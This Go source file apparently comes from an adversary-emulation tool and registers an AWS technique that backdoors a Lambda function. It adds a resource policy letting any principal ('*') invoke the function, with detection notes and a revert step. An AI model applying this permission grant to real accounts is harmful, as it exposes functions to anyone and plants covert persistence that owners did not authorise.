package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/lambda"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.lambda-backdoor-function",
		FriendlyName: "Backdoor Lambda Function Through Resource-Based Policy",
		Description: `
Establishes persistence by backdooring a lambda function to allow its invocation from an external AWS account.

Warm-up: 

- Create a Lambda function.

Detonation: 

- Modify the Lambda function resource-base policy to allow lambda:InvokeFunction from an external, fictitious AWS account.
`,
		Detection: `
- Using CloudTrail's <code>AddPermission20150331</code> and <code>AddPermission20150331v2</code> events.

- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda), which triggers a finding when permissions are added to a Lambda function making it 
public or accessible from another account.
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               false, // lambda:AddPermissions cannot be called multiple times with the same statement ID
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var policyStatementId = "backdoor"

func detonate(params map[string]string) error {
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())
	lambdaFunctionName := params["lambda_function_name"]

	log.Println("Backdooring the resource-based policy of the Lambda function " + lambdaFunctionName)
	result, err := lambdaClient.AddPermission(context.Background(), &lambda.AddPermissionInput{
		FunctionName: &lambdaFunctionName,
		Action:       aws.String("lambda:InvokeFunction"),
		Principal:    aws.String("*"), // I intended to share it only with a specific account ID, but couldn't get it working.
		StatementId:  &policyStatementId,
	})

	if err != nil {
		return errors.New("unable to backdoor Lambda function: " + err.Error())
	}

	log.Println(*result.Statement)

	return nil
}

func revert(params map[string]string) error {
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())
	lambdaFunctionName := params["lambda_function_name"]

	log.Println("Removing the backdoor statement in the resource-based policy of the Lambda function " + lambdaFunctionName)
	_, err := lambdaClient.RemovePermission(context.Background(), &lambda.RemovePermissionInput{
		FunctionName: &lambdaFunctionName,
		StatementId:  &policyStatementId,
	})

	if err != nil {
		return errors.New("unable to remove backdoor statement of Lambda function: " + err.Error())
	}

	return nil
}
